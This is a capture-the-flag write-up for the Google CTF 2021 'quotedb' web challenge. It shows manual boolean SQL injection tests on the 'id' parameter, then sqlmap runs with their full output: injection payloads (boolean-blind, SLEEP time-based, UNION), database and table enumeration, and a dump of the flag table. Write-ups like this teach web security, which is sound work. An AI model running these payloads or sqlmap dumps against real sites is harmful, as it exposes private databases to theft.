# Unknown - Prison Cell
Category: Web

## Description

> You don’t manage to disarm the guard, he is quicker than you are. He knocks you out, and when you wake up you’re inside a prison cell, but it doesn’t seem like you’re on a boat anymore, you must be inside the headquarters on the secret island! The cell is claustrophobic, with rusty iron bars and a bed of concrete.
> 
> Challenge: web-quotedb (web)
> 
> In this challenge, you have to find the hidden flag. Good luck!

## Solution

We get a simple website:

```console
┌──(user@kali)-[/media/sf_CTFs/google/14_Unknown_-_Prison_Cell]
└─$ curl https://quotedb-web.2021.ctfcompetition.com/
<html>
  <head>
    <title>Quote DB</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-gtEjrD/SeCtmISkJkNUaaKMoLD0//ElJ19smozuHV6z3Iehds+3Ulb9Bn9Plx0x4" crossorigin="anonymous"></script>
  </head>

  <body>

<h1>Welcome to the amazing Quote DB</h1>
<div>
  <p>Here's the quote of the day for you: </p>
  <p class='quote'>
    "It doesn't help to fight crime to put people in prison who are innocent." - Stephen Breyer  </p>
  <p>
    If you'd like to return to this quote, just
    <a href="?id=7">click here</a>.
  </p>
</div>

</body>
</html>
```

As the website suggests, it's possible to access a specific quote directly:

```console
┌──(user@kali)-[/media/sf_CTFs/google/14_Unknown_-_Prison_Cell]
└─$ curl https://quotedb-web.2021.ctfcompetition.com/?id=7
<html>
  <head>
    <title>Quote DB</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-gtEjrD/SeCtmISkJkNUaaKMoLD0//ElJ19smozuHV6z3Iehds+3Ulb9Bn9Plx0x4" crossorigin="anonymous"></script>
  </head>

  <body>

<h1>Welcome to the amazing Quote DB</h1>
<div>
  <p>Here's the quote of the day for you: </p>
  <p class='quote'>
    "It doesn't help to fight crime to put people in prison who are innocent." - Stephen Breyer  </p>
  <p>
    If you'd like to return to this quote, just
    <a href="?id=7">click here</a>.
  </p>
</div>

</body>
</html>
```

Since this is a quote DB, it's very tempting to try SQL injection:

```console
┌──(user@kali)-[/media/sf_CTFs/google/14_Unknown_-_Prison_Cell]
└─$ curl -G https://quotedb-web.2021.ctfcompetition.com/ --data-urlencode "id=4 AND 1=1"
<html>
  <head>
    <title>Quote DB</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-gtEjrD/SeCtmISkJkNUaaKMoLD0//ElJ19smozuHV6z3Iehds+3Ulb9Bn9Plx0x4" crossorigin="anonymous"></script>
  </head>

  <body>

<h1>Welcome to the amazing Quote DB</h1>
<div>
  <p>Here's the quote of the day for you: </p>
  <p class='quote'>
    "Going to prison is like dying with your eyes open." - Bernard Kerik  </p>
  <p>
    If you'd like to return to this quote, just
    <a href="?id=4">click here</a>.
  </p>
</div>

</body>
</html>

┌──(user@kali)-[/media/sf_CTFs/google/14_Unknown_-_Prison_Cell]
└─$ curl -G https://quotedb-web.2021.ctfcompetition.com/ --data-urlencode "id=4 AND 1=0"
<html>
  <head>
    <title>Quote DB</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-gtEjrD/SeCtmISkJkNUaaKMoLD0//ElJ19smozuHV6z3Iehds+3Ulb9Bn9Plx0x4" crossorigin="anonymous"></script>
  </head>

  <body>
Quote not found
```

We'll let `sqlmap` do the rest:

```console
┌──(user@kali)-[/media/sf_CTFs/google/14_Unknown_-_Prison_Cell]
└─$ sqlmap -u https://quotedb-web.2021.ctfcompetition.com/?id=4
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.5.3#stable}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:19:30 /2021-08-30/

[10:19:31] [INFO] testing connection to the target URL
[10:19:32] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:19:32] [INFO] testing if the target URL content is stable
[10:19:33] [INFO] target URL content is stable
[10:19:33] [INFO] testing if GET parameter 'id' is dynamic
[10:19:33] [INFO] GET parameter 'id' appears to be dynamic
[10:19:33] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[10:19:34] [INFO] testing for SQL injection on GET parameter 'id'
[10:19:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:19:35] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="of")
[10:19:41] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[10:22:22] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[10:22:22] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[10:22:22] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[10:22:23] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[10:22:23] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[10:22:23] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[10:22:24] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[10:22:24] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[10:22:24] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:22:24] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:22:25] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:22:25] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:22:25] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[10:22:25] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[10:22:26] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:22:26] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[10:22:26] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[10:22:27] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[10:22:27] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[10:22:27] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[10:22:28] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[10:22:28] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[10:22:28] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[10:22:28] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[10:22:29] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[10:22:29] [INFO] testing 'Generic inline queries'
[10:22:29] [INFO] testing 'MySQL inline queries'
[10:22:30] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[10:22:30] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[10:22:30] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[10:22:30] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[10:22:31] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[10:22:31] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[10:22:31] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'

[10:22:42] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[10:22:42] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[10:22:42] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[10:22:43] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[10:22:44] [INFO] target URL appears to have 3 columns in query
[10:22:46] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
sqlmap identified the following injection point(s) with a total of 76 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=4 AND 9967=9967

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=4 AND (SELECT 2955 FROM (SELECT(SLEEP(5)))SZDg)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-7956 UNION ALL SELECT CONCAT(0x7178766b71,0x7247634c72694e7a494f574262797659764f49556a4d786d674e51627a62725a4350664551505a76,0x71787a6a71),NULL,NULL-- -
---
[10:22:46] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 19.10 or 20.04 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[10:22:46] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 56 times
[10:22:46] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/quotedb-web.2021.ctfcompetition.com'

[*] ending @ 10:22:46 /2021-08-30/


┌──(user@kali)-[/media/sf_CTFs/google/14_Unknown_-_Prison_Cell]
└─$ sqlmap -u https://quotedb-web.2021.ctfcompetition.com/?id=4 --dbs
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.5.3#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:23:14 /2021-08-30/

[10:23:14] [INFO] resuming back-end DBMS 'mysql'
[10:23:14] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=4 AND 9967=9967

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=4 AND (SELECT 2955 FROM (SELECT(SLEEP(5)))SZDg)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-7956 UNION ALL SELECT CONCAT(0x7178766b71,0x7247634c72694e7a494f574262797659764f49556a4d786d674e51627a62725a4350664551505a76,0x71787a6a71),NULL,NULL-- -
---
[10:23:14] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[10:23:14] [INFO] fetching database names
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] quotedb
[*] sys

[10:23:15] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/quotedb-web.2021.ctfcompetition.com'

[*] ending @ 10:23:15 /2021-08-30/


┌──(user@kali)-[/media/sf_CTFs/google/14_Unknown_-_Prison_Cell]
└─$ sqlmap -u https://quotedb-web.2021.ctfcompetition.com/?id=4  --tables -D quotedb
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.5.3#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:23:52 /2021-08-30/

[10:23:52] [INFO] resuming back-end DBMS 'mysql'
[10:23:53] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=4 AND 9967=9967

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=4 AND (SELECT 2955 FROM (SELECT(SLEEP(5)))SZDg)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-7956 UNION ALL SELECT CONCAT(0x7178766b71,0x7247634c72694e7a494f574262797659764f49556a4d786d674e51627a62725a4350664551505a76,0x71787a6a71),NULL,NULL-- -
---
[10:23:53] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 19.10 or 20.04 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[10:23:53] [INFO] fetching tables for database: 'quotedb'
Database: quotedb
[2 tables]
+--------+
| flag   |
| quotes |
+--------+

[10:23:54] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/quotedb-web.2021.ctfcompetition.com'

[*] ending @ 10:23:53 /2021-08-30/


┌──(user@kali)-[/media/sf_CTFs/google/14_Unknown_-_Prison_Cell]
└─$ sqlmap -u https://quotedb-web.2021.ctfcompetition.com/?id=4  --dump -D quotedb -T flag
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.5.3#stable}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:24:24 /2021-08-30/

[10:24:24] [INFO] resuming back-end DBMS 'mysql'
[10:24:25] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=4 AND 9967=9967

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=4 AND (SELECT 2955 FROM (SELECT(SLEEP(5)))SZDg)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-7956 UNION ALL SELECT CONCAT(0x7178766b71,0x7247634c72694e7a494f574262797659764f49556a4d786d674e51627a62725a4350664551505a76,0x71787a6a71),NULL,NULL-- -
---
[10:24:25] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[10:24:25] [INFO] fetching columns for table 'flag' in database 'quotedb'
[10:24:25] [INFO] fetching entries for table 'flag' in database 'quotedb'
Database: quotedb
Table: flag
[1 entry]
+----+--------------------------------------+
| id | flag                                 |
+----+--------------------------------------+
| 1  | CTF{little_bobby_tables_we_call_him} |
+----+--------------------------------------+

[10:24:26] [INFO] table 'quotedb.flag' dumped to CSV file '/home/user/.local/share/sqlmap/output/quotedb-web.2021.ctfcompetition.com/dump/quotedb/flag.csv'
[10:24:26] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/quotedb-web.2021.ctfcompetition.com'

[*] ending @ 10:24:26 /2021-08-30/
```